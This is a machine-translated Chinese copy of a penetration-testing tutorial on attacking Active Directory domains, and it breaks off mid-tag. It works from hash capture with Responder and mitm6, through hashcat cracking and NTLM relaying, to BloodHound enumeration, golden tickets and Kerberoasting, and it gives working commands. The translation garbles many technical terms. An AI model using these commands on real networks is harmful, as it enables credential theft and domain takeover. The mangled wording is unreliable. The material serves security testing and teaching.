<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🧑🏿‍🤝‍🧑🏾 👨🏾‍🤝‍👨🏼 🔤 域攻击 😒 🉐 💝</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="在进行渗透测试时，我们经常检测到域配置中的错误。 尽管这对于许多人而言似乎并不重要，但实际上，这种不准确之处可能会导致整个领域受到损害。 

 例如，根据一家公司的渗透测试的结果，我们得出的结论是，域中所有可用的计算机均不低于Windows10 / Windows Server2016，并且它们上具...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>域攻击</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/jetinfosystems/blog/449278/"><img src="https://habrastorage.org/webt/om/yi/ln/omyiln4hxyukdu7znc3sn5j-mzy.png"><br> 在进行渗透测试时，我们经常检测到域配置中的错误。 尽管这对于许多人而言似乎并不重要，但实际上，这种不准确之处可能会导致整个领域受到损害。 <br><br> 例如，根据一家公司的渗透测试的结果，我们得出的结论是，域中所有可用的计算机均不低于Windows10 / Windows Server2016，并且它们上具有所有最新的补丁程序。 定期扫描网络，机器很硬。 所有用户都坐在令牌中，不知道他们的“ 20个字符的密码”。 一切似乎都很好，但是尚未禁用IPv6。 域捕获方案如下所示： <br><br>  mitm6-&gt; ntlmrelay-&gt;通过委派进行攻击-&gt;收到本地管理员密码哈希-&gt;收到域管理员密码哈希。 <br><br> 不幸的是，诸如OSCP，GPEN或CEH之类的流行认证并未教授Active Directory渗透测试。 <br><br> 在本文中，我们将探讨渗透测试中使用的几种Active Directory攻击类型以及所使用的工具。 绝对不能将其视为所有攻击和工具的完整指南，其中确实有很多，并且很难写成一篇文章。 <br><br> 因此，为演示起见，我们在Kali Linux 2019上使用笔记本电脑，并在VMware上使用其上的虚拟主机。 想象一下，渗透测试的主要目标是获得域管理员权限，作为输入，我们可以通过以太网访问公司的公司网络。 要开始测试域，我们需要一个帐户。 <br><a name="habracut"></a><br><h1> 取得帐号 </h1><br> 在我看来，请考虑两种最常见的获取域帐户登录名和密码的方法：LLMNR / NBNS欺骗和对IPv6协议的攻击。 <br><br><h3>  LLMNR / NBNS欺骗 </h3><br> 关于这种攻击已经有很多说法。 最重要的是，如果DNS失败，客户端将发出多播LLMNR并广播NBT-NS广播请求以解析主机名。 任何网络用户都可以回答此类请求。 <br><br> 允许攻击的工具： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">回应</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">投机</a> </li><li>  Metasploit模块：辅助/欺骗/ llmnr / llmnr_response，辅助/欺骗/ nbns / nbns_response， <br> 辅助/服务器/捕获/ smb，辅助/服务器/捕获/ http_ntlm </li></ul><br> 成功攻击后，我们可以获取用户密码的NetNTLM哈希。 <br><br><pre><code class="bash hljs">Responder -I eth0 -wrf</code> </pre> <br><img src="https://habrastorage.org/webt/ul/6f/1r/ul6f1rsc1dbtugnzoiup43cofnc.png"><br><br> 由此产生的哈希值，我们可以调试或执行NTLM中继。 <br><br><h3>  IPv6攻击 </h3><br> 如果在公司网络中使用IPv6，我们可以响应DHCPv6请求，并将我们的IP地址设置为被攻击机器上的DNS服务器。 由于IPv6优先于IPv4，因此客户端DNS查询将发送到我们的地址。 在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>阅读有关攻击的更多信息。 <br><br> 工具： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">mitm6</a> </li></ul><br> 运行mitm6实用程序 <br><br><pre> <code class="bash hljs">mitm6 -i vmnet0</code> </pre> <br> 攻击完成后，带有我们的IPv6地址的新DNS服务器将出现在受攻击的工作站上。 <br><br><img src="https://habrastorage.org/webt/ww/w4/w3/www4w3x2eqtuytsmysia_deoi_y.png"><br><br> 被攻击的机器将尝试使用我们的机器进行身份验证。 使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">smbserver.py</a>实用程序提升了SMB服务器的性能之后，我们可以获得用户密码的哈希值。 <br><br><pre> <code class="bash hljs">smbserver.py -smb2support SMB /root/SMB</code> </pre> <br><img src="https://habrastorage.org/webt/df/s8/jx/dfs8jxcdecrikctqxdxzbuyq8wk.png"><br><br><h2> 捕获的哈希动作 </h2><br> 下一步是对密码哈希执行加密攻击并以明文形式获取密码，或者执行NTLM中继。 <br><br><h3> 密码暴力破解 </h3><br> 很简单：使用密码哈希，hashcat <br><br><pre> <code class="bash hljs">hashcat -m 5600 -a 3 hash.txt /usr/share/wordlists/rockyou.txt</code> </pre> <br> 和布鲁斯。 可以获取密码，也可以不获取密码：) <br><br><img src="https://habrastorage.org/webt/pf/l8/7g/pfl87glgjcfbove5ywlkmul1uyi.png"><br>  <i>Harvey用户密码已恢复-Pbvf2019</i> <br><br><h3>  NTLM中继 </h3><br> 我们还可以执行NTLM中继。 确保未使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SMB签名后，我们</a>使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ntlmrelayx.py</a>实用程序并进行攻击。 同样，根据目标，我们选择所需的向量。 让我们考虑其中的一些。 <br><br><br><h4> 通过SMB协议访问受攻击的计算机 </h4><br> 用钥匙<i>i</i>进行攻击。 <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t 192.168.1.5 -l loot -i</code> </pre> <br><img src="https://habrastorage.org/webt/jk/3w/zu/jk3wzuzoxwr2qnrzhagq7bnweya.png"><br><br> 成功攻击后，我们可以使用netcat连接到远程计算机。 <br><br><img src="https://habrastorage.org/webt/1f/8x/ba/1f8xbajj3gofx2bonp0quqdnxae.png"><br><br><h4> 域信息收集 </h4><br> 在这种情况下，我们执行到域控制器的中继。 <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldap://192.168.1.2</code> </pre> <br> 如果攻击成功，我们将获得有关域的详细信息： <br><br><img src="https://habrastorage.org/webt/el/gf/eu/elgfeumon83qjseesppzb8yjitq.png"><br><br><h4> 将新计算机添加到域 </h4><br> 默认情况下，每个用户都可以在域中最多创建10台计算机。 要创建计算机，您需要使用ldaps协议在域控制器上运行中继。 禁止通过未加密的ldap连接创建用户和计算机。 另外，如果通过SMB的连接被拦截，则无法创建帐户。 <br><br><pre> <code class="bash hljs">ntlmrelayx.py -t ldaps://192.168.1.2 --add-computer</code> </pre> <br><img src="https://habrastorage.org/webt/ei/xe/qi/eixeqiuxwttuxx3xmmroqrj8smy.png"><br><br> 正如您在图中看到的，我们能够创建计算机RORYOTGS $。 <br><br> 当创建10台以上的计算机时，会出现以下形式的错误： <br><br><img src="https://habrastorage.org/webt/gb/za/ar/gbzaarxwpzhs0zhy4zi8kvwuqjo.png"><br><br> 使用RORYOTGS $计算机的凭据，我们可以对域控制器执行合法请求。 <br><br><h1> 域信息收集 </h1><br> 因此，我们有一个域用户或计算机帐户。 要继续测试，我们需要收集可用信息以进行进一步的攻击计划。 考虑一些可以帮助我们确定最关键系统的搜索，计划和执行攻击的工具。 <br><br><h3> 猎犬 </h3><br> 几乎所有内部​​渗透测试中都使用的最重要的工具之一。 该项目正在积极开发中，并具有新功能。 <br><br><div class="spoiler">  <b class="spoiler_title">猎犬收集的信息</b> <div class="spoiler_text"><ul><li> 组-执行组成员资格收集 </li><li>  LocalAdmin-执行本地管理员收集 </li><li>  RDP-执行远程桌面用户收集 </li><li>  DCOM-执行分布式COM用户集合 </li><li>  GPOLocalGroup-使用组策略对象执行本地管理员收集 </li><li> 会话-执行会话收集 </li><li>  ComputerOnly-执行本地管理，RDP，DCOM和会话收集 </li><li>  LoggedOn-执行特权会话收集（需要目标系统上的管理员权限） </li><li> 信任-执行域信任枚举 </li><li>  ACL-执行ACL的收集 </li><li> 容器-执行容器的收集； </li><li>  DcOnly-仅使用LDAP执行收集。 包括组，信任，ACL，ObjectProps，容器和GPOLocalGroup </li><li> 全部-执行除GPOLocalGroup和LoggedOn之外的所有收集方法 </li><li> 搜索林-搜索林中的所有域，而不仅仅是您当前的域 </li><li> 域-搜索特定域。 如果为null，则使用当前域（默认值：null） </li><li> 隐形-执行隐形收集方法。 所有隐形选项均为单线程 </li><li>  SkipGCDeconfliction-会话枚举期间跳过全局编录去冲突。 这样可以加快枚举速度，但会导致数据可能不正确 </li><li>  ExcludeDc-从枚举中排除域控制器（避免使用Microsoft ATA标志） </li><li>  ComputerFile-指定一个文件以从中加载计算机名称/ IP </li><li>  OU-指定要枚举的OU </li></ul><br></div></div><br> 信息收集器是<a href="">SharpHound.exe</a> （需要安装.NET v3.5）和用powershell编写的脚本<a href="">SharpHound.ps1</a> 。 还有一个由第三方Python开发人员<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Bloodhound-python</a>编写的编译器。 <br><br> 作为数据库，使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Neo4j</a> ，它具有自己的语法，该语法使您可以执行自定义查询。 您可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>阅读有关语法的更多信息。 <br><br><div class="spoiler">  <b class="spoiler_title">开箱即用有12个请求</b> <div class="spoiler_text"><ul><li> 查找所有域管理员 </li><li> 查找域管理员的最短路径 </li><li> 查找具有DCSync权限的主体 </li><li> 具有外部域组成员身份的用户 </li><li> 具有外国域组成员身份的组 </li><li> 映射域信任 </li><li> 不受约束的委派系统的最短路径 </li><li> 来自Kerberoastable用户的最短路径 </li><li> 可通过Kerberoastable用户访问域管理员的最短路径 </li><li> 自有校长的最短路径 </li><li> 拥有人到域管理员的最短路径 </li><li> 实现高价值目标的最短路径 </li></ul><br></div></div><br> 开发人员还提供了<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">DBCreator.py</a>脚本，该脚本允许您生成随机数据库以进行测试。 <br><br><img src="https://habrastorage.org/webt/do/if/95/doif95xzpkhd3xqbdjbwdenmrfu.png"><br><br>  Neo4j具有REST API。 有多种实用程序可以连接到数据库并使用接收到的数据： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">赛狗</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Gofetch</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">愤怒的小鸟</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">gt生成器</a> </li></ul><br> 让我们考虑其中的一些。 <br><br><h3> 赛狗 </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">CypherDog</a>是用powershell编写的BloodHound外壳。 包括27个cmdlet。 <br><br><div class="spoiler">  <b class="spoiler_title">Cmdlet清单</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Cmdlet </td><td> 剧情简介 </td></tr><tr><td>  Get-BloodHoundCmdlet </td><td>  BloodHound RTFM-获取Cmdlet </td></tr><tr><td> 送血猎犬 </td><td>  BloodHound POST-REST API的密码 </td></tr><tr><td>  Get-BloodHoundNode </td><td>  BloodHound节点-获取节点 </td></tr><tr><td>  Search-BloodHoundNode </td><td> 猎狗节点-搜索节点 </td></tr><tr><td>  New-BloodHoundNode </td><td>  BloodHound节点-创建节点 </td></tr><tr><td>  Set-boundhoundnode </td><td>  BloodHound节点-更新节点 </td></tr><tr><td>  Remove-BloodHoundNode </td><td>  BloodHound节点-删除节点 </td></tr><tr><td>  Get-BloodHoundNodeList </td><td>  BloodHound节点-获取列表 </td></tr><tr><td>  Get-BloodHoundNodeHighValue </td><td>  BloodHound节点-获得高价值 </td></tr><tr><td>  Get-BloodHoundNodeOwned </td><td>  BloodHound节点-拥有 </td></tr><tr><td>  Get-BloodHoundNodeNote </td><td>  BloodHound节点-获取注释 </td></tr><tr><td>  Set-BloodHoundNodeNote </td><td>  BloodHound节点-设置注释 </td></tr><tr><td>  Get-BloodHoundBlacklist </td><td>  BloodHound节点-获取黑名单 </td></tr><tr><td>  Set-BloodHoundBlacklist </td><td>  BloodHound节点-设置黑名单 </td></tr><tr><td>  Remove-BloodHoundBlacklist </td><td>  BloodHound节点-删除黑名单 </td></tr><tr><td>  Get-BloodHoundEdge </td><td> 猎狗之刃-获取目标 </td></tr><tr><td>  Get-BloodHoundEdgeReverse </td><td> 猎狗之刃-获取资源 </td></tr><tr><td>  Get-BloodHoundEdgeCrossDomain </td><td>  BloodHound Edge-获取跨域 </td></tr><tr><td>  Get-BloodHoundEdgeCount </td><td>  BloodHound Edge-获得计数 </td></tr><tr><td>  Get-BloodHoundEdgeInfo </td><td>  BloodHound Edge-获取信息 </td></tr><tr><td> 新血缘 </td><td>  BloodHound Edge-创建边缘 </td></tr><tr><td>  Remove-BloodHoundEdge </td><td>  BloodHound Edge-删除边缘 </td></tr><tr><td>  Get-BloodHoundPathShort </td><td> 猎犬路径-最短 </td></tr><tr><td>  Get-BloodHoundPathAny </td><td> 猎犬路径-获得任何 </td></tr><tr><td>  Get-BloodHoundPathCost </td><td> 猎犬路径-获得费用 </td></tr><tr><td>  Get-BloodHoundPathCheap </td><td>  BloodHound Path-获得最便宜的 </td></tr><tr><td>  Get-BloodHoundWald0IO </td><td>  BloodHound Path-获取Wald0指数 </td></tr></tbody></table></div><br></div></div><br><div class="spoiler">  <b class="spoiler_title">使用范例</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td> 团队 </td><td> 内容描述 </td></tr><tr><td>  Search-BloodHoundNode-类型计算机-Property unconstraineddelegation -Value $ true | 选择名称，服务主体名称，不受限制的委托，操作系统| 格式清单 </td><td> 搜索具有无限Kerberos委派的计算机 </td></tr><tr><td> 边缘用户ADMINISTRATOR@JET.LAB MemberOf组 </td><td> 列出用户组 </td></tr><tr><td> 什么计算机具有会话用户ADMINISTRATOR@JET.LAB </td><td> 列出有管理员用户会话的计算机 </td></tr><tr><td> 路径用户计算机HARVEY@JET.LAB DC1.JET.LAB </td><td> 打印从用户到域控制器的路径 </td></tr><tr><td>  “ DOMAIN ADMINS@JET.LAB”组的哪个用户MemberOf * | 列表登录 </td><td> 列出属于DOMAIN Admins组的活动用户会话 </td></tr><tr><td>  'DOMAIN ADMINS@JET.LAB'组的哪个用户MemberOf | 列表登录|？ 操作*-匹配7 | 列出AdminTo | 选择名字 </td><td> 列出在运行Windows 7的工作站上具有管理员权限的用户，这些工作站具有来自域管理员组的用户会话 </td></tr></tbody></table></div><br></div></div><br> 默认情况下，访问neo4j数据库需要身份验证。 您可以通过编辑neo4j.conf文件来禁用身份验证。 它需要取消注释<i>dbms.security.auth_enabled = false行。</i> 但是不建议这样做，因为任何用户都可以通过127.0.0.1:7474（默认配置）连接到数据库。 您可以在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a>阅读有关neo4j的身份验证和授权的更多<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">信息。</a> <br><br><h3>  Gofetch </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GoFetch</a>使用在猎犬中创建的图形来计划和执行攻击。 <br><br><div class="spoiler">  <b class="spoiler_title">猎犬图示例</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/l3/pm/g_/l3pmg_9fw8yy5dkbrftpfq4flyo.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">GoFetch逻辑</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ph/g-/us/phg-usiezxoh0-jz2zvfq4iack8.jpeg"><br></div></div><br> 攻击发起 <br><br><pre> <code class="bash hljs">.\Invoke-GoFetch.ps1 -PathToGraph .\pathFromBloodHound.json</code> </pre> <br><h3>  gt生成器 </h3><br> 使用BloodHound数据的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">gt-generator</a>可以轻松创建黄金票证。 要接收黄金票，仅需要KRBTGT用户的用户名和密码哈希。 <br><br><pre> <code class="bash hljs">python gt-generator.py -s 127.0.0.1 -u user -p pass administrator &lt;KRBTGT_HASH&gt;</code> </pre> <br><img src="https://habrastorage.org/webt/oo/d3/b8/ood3b84ooqbwwawb-pn7nybey_s.png"><br><br><h3> 威视 </h3><br>  <a href="">PowerView</a>是<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PowerSploit</a>附带的Powershell框架。 以下是一些cmdlet的列表，这些cmdlet可以帮助您收集有关域的信息。 <br><br><div class="spoiler">  <b class="spoiler_title">Cmdlet清单</b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td>  Get-NetDomain-域jet.lab </td><td> 获取当前域 </td></tr><tr><td> 获取域SID </td><td> 获取当前域SID </td></tr><tr><td>  Get-NetDomainController-域jet.lab </td><td> 获取域的域控制器 </td></tr><tr><td>  Get-NetUser-域jet.lab -UserName labuser </td><td> 获取域的用户 </td></tr><tr><td>  Get-NetGroup *组名* </td><td> 获取当前域中的所有组 </td></tr><tr><td>  Get-NetGroupMember -GroupName“域管理员” </td><td> 获取Domain Admins组的所有成员 </td></tr><tr><td>  Get-NetGroup-用户名“ domain_user” </td><td> 获取用户的组成员身份 </td></tr><tr><td>  Get-NetComputer-完整数据 </td><td> 获取域中的所有计算机 </td></tr><tr><td>  Find-LocalAdminAccess-详细 </td><td> 查找当前域中当前用户具有本地管理员访问权限的所有计算机 </td></tr><tr><td>  Get-NetSession-计算机名dc02.jet.lab </td><td> 列出特定计算机上的会话 </td></tr><tr><td> 调用UserHunter -CheckAccess </td><td> 查找域管理员已登录且当前用户有权访问的计算机 </td></tr></tbody></table></div><br></div></div><br><h3>  Adidnsdump </h3><br> 在Active Directory中使用集成DNS时，任何域用户都可以查询所有默认DNS记录。 <br><br> 使用的工具： <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Adidnsdump。</a> <br><br><img src="https://habrastorage.org/webt/hq/48/rb/hq48rboxepskftc5tnlbsnvgfr0.gif"><br><br><h1> 域攻击 </h1><br> 现在我们有了域信息，我们进入渗透测试的下一个阶段-直接进行攻击。 考虑4个潜在向量： <br><br><ol><li> 焙烧 </li><li> 通过ACL攻击 </li><li>  Kerberos委派 </li><li> 滥用GPO权限 </li></ol><br><br><h3> 焙烧 </h3><br> 这类攻击针对Kerberos协议。 有两种类型的攻击，例如Roasting： <br><br><ul><li> 喀伯鲁斯特 </li><li> 阿斯普鲁司特 </li></ul><br><h4> 喀伯鲁斯特 </h4><br> 该攻击最初是由2014年<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">DerbyCon</a>的timmedin用户演示的（ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">视频</a> ）。 成功攻击后，我们将能够在脱机模式下整理服务超声波的密码，而不必担心阻止用户。 服务帐户经常具有过多的权限和永久密码，这可能使我们可以获得域管理员权限。 <br> 要了解攻击的本质，请考虑Kerberos如何工作。 <br><br><img src="https://habrastorage.org/webt/vj/g2/ud/vjg2ud1wzdr89drnazgcob0eaum.png"><br><br>  1.将密码转换为NTLM哈希，使用哈希对时间戳进行加密，然后将其作为TGT票证请求（AS-REQ）中的身份验证器发送给KDC。 域控制器（KDC）检查用户信息并创建TGT票证。 <br><br>  2. TGT票证已加密，签名并发送给用户（AS-REP）。 仅Kerberos服务（KRBTGT）可以打开和读取TGT票证中的数据。 <br><br>  3.用户应TGS票证（TGS-REQ）的请求将TGT票证提交到域控制器。 域控制器打开TGT票证并检查PAC校验和。 <br><br>  4.使用服务帐户密码的NTLM哈希加密TGS票证，并将其发送给用户（TGS-REP）。 <br><br>  5.用户向运行服务的计算机（AP-REQ）提供TGS票证。 该服务使用其NTLM哈希值打开TGS票证。 <br><br>  6.提供对服务的访问（AS-REP）。 <br><br> 收到TGS门票（TGS-REP）后，我们可以离线找到服务帐户的密码。 例如，使用hashcat。 <br><br> 根据<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">RFC396</a> ，为Kerberos协议保留20种加密类型。 现在按照优先级使用的加密类型： <br><br><ul><li>  AES256_CTS_HMAC_SHA1 </li><li>  AES128_CTS_HMAC_SHA1 </li><li>  RC4_HMAC_MD5 </li></ul><br> 在Windows的最新版本中，默认情况下使用AES加密。 但是，为了与Windows Vista和Windows 2008 Server以下的系统兼容，需要支持RC4算法。 进行攻击时，总是首先尝试获取具有RC4_HMAC_MD5加密的TGS票证，这样可以使用更快的密码，然后再进行其他操作。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Harmj0y</a>进行了一项有趣的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">研究</a> ，发现如果用户属性指定加密仅支持Kerberos AES128和AES256，则仍会使用RC4_HMAC_MD5加密来发行Kerberos票证。 <br><br><img src="https://habrastorage.org/webt/el/4w/vn/el4wvniixybekufn7jswfcr7pey.png"><br><br> 在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">域</a>级别必须禁用RC4_HMAC_MD5 <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">。</a> <br><br> 角er攻击有两种方法。 <br><br>  1.旧方法。  TGS票证通过Powershell类的setpn.exe或.NET System.IdentityModel.Tokens.KerberosRequestorSecurityToken请求，使用mimikatz从内存中检索，然后转换为所需的格式（John，Hashcat）并进行排序。 <br><br>  2.新方法。  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">machosec</a>注意到<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">KerberosRequestorSecurityToken</a>类具有<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GetRequest</a>方法，该方法从TGS票证中提取带有密码的加密部分。 <br><br> 进行攻击的工具： <br><br>  1）搜索SPN记录 <br><br><ul><li>  <a href="">GetUserSPN.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Find-PSServiceAccounts.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Get-NetUSER -SPN</a> </li><li>  （Get-ADUser -Filter {ServicePrincipalName -ne“ $ null”}-属性ServicePrincipalName）。ServicePrincipalName </li></ul><br>  2）索取TGS门票 <br><br><ul><li>  setspn.exe（Windows本地实用程序） </li><li> 通过Powershell进行票务请求 <br><br><pre> <code class="plaintext hljs">Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “&lt;ServicePrincipalName&gt;”</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Request-SPNTicket</a> </li></ul><br> 您可以使用klist命令查看当前缓存的票证。 <br><br><div class="spoiler">  <b class="spoiler_title">常用SPN记录</b> <div class="spoiler_text"><ul><li>  TERMSRV-远程桌面 </li><li>  SmtpSVC和SMTP-邮件 </li><li>  WSMAN-WinRM </li><li>  ExchangeAB，ExchangeRFR，ExchangeMDM-MS Exchange </li><li>  POP / POP3-POP3邮政服务 </li><li>  IMAP / IMAP4-IMAP电子邮件服务 </li><li>  MSSQLSvc-Microsoft SQL Server </li><li>  MONGO-MongoDB数据库服务器 </li><li>  DNS-DNS服务器 </li><li>  HTTP，WWW-Web服务器 </li><li>  LDAP-LDAP </li><li>  FTP-FTP服务器 </li></ul><br></div></div><br>  3）出口车票： <br><br><ul><li>  <a href="">Invoke-Mimikatz-</a>命令'“ Kerberos ::列表/导出”' </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Mimikatz-</a>命令'“ Kerberos ::列表/导出”' </li><li>  <a href="">喀巴鲁司特</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">tgsrepack.py</a> </li></ul><br><br> 自动执行所有3点的示例： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">RiskiskSPN</a> <br><br><pre> <code class="bash hljs">Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format <span class="hljs-string"><span class="hljs-string">"Hashcat"</span></span> | Out-File kerberoasting.txt</code> </pre> </li><li>  <a 